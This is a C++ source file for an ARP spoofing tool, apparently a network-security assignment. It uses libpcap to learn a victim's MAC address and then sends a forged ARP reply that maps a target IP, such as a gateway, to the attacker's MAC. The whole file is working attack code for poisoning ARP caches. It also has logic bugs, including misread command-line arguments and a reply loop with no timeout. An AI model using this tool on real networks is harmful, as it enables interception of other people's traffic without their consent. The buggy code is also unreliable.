#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <array>
#include <string>
#include <fstream>
#include <regex>
#include <iostream>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>

#include "ethhdr.h"
#include "arphdr.h"

using namespace std;

#define MAC_ADDR_LEN 6  // MAC 주소의 길이 정의

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool get_mac_address(const string& if_name, uint8_t* mac_addr_buf) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) {
        cerr << "Failed to create socket" << endl;
        return false;
    }
    strncpy(ifr.ifr_name, if_name.c_str(), IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) == -1) {
        cerr << "Failed to get MAC address" << endl;
        close(sock);
        return false;
    }
    close(sock);
    memcpy(mac_addr_buf, ifr.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
    return true;
}

string get_sender_mac(pcap_t* handle, const uint8_t* my_mac, const char* my_ip, const char* sender_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(my_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(my_mac);
    packet.arp_.sip_ = htonl(Ip(my_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        cerr << "Failed to send ARP request: " << pcap_geterr(handle) << endl;
        return "";
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* reply;
        int ret = pcap_next_ex(handle, &header, &reply);

        if (ret == 1) {
            auto* eth_hdr = (EthHdr*)reply;
            if (ntohs(eth_hdr->type_) != EthHdr::Arp) continue;

            auto* arp_hdr = (ArpHdr*)(reply + sizeof(EthHdr));
            if (ntohs(arp_hdr->op_) != ArpHdr::Reply) continue;
            if (arp_hdr->sip_ != htonl(Ip(sender_ip))) continue;
            if (arp_hdr->tip_ != htonl(Ip(my_ip))) continue;

            return string(arp_hdr->smac_);
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    string dev_str = string(dev);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    uint8_t my_mac[MAC_ADDR_LEN];

    if (!get_mac_address(dev_str, my_mac)) {
        cerr << "Failed to get MAC address for interface " << dev_str << endl;
        return -1;
    }
   
   
    for (int i = 1; i < argc; i += 2) {
        EthArpPacket packet;
        const char* sender_ip = argv[i];
        const char* target_ip = argv[i + 1];

	printf("sip : %s\n", sender_ip);
	printf("tip : %s\n", target_ip);

        string sender_mac = get_sender_mac(handle, my_mac, argv[2], sender_ip);

        if (sender_mac.empty()) {
            cerr << "Failed to get sender MAC address" << endl;
            continue;
        }

        packet.eth_.dmac_ = Mac(sender_mac.c_str());
        packet.eth_.smac_ = Mac(my_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = Mac(my_mac);
        packet.arp_.sip_ = htonl(Ip(target_ip));
        packet.arp_.tmac_ = Mac(sender_mac.c_str());
        packet.arp_.tip_ = htonl(Ip(sender_ip));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            cerr << "Failed to send ARP reply: " << pcap_geterr(handle) << endl;
        }
    }

    pcap_close(handle);
    return 0;
}
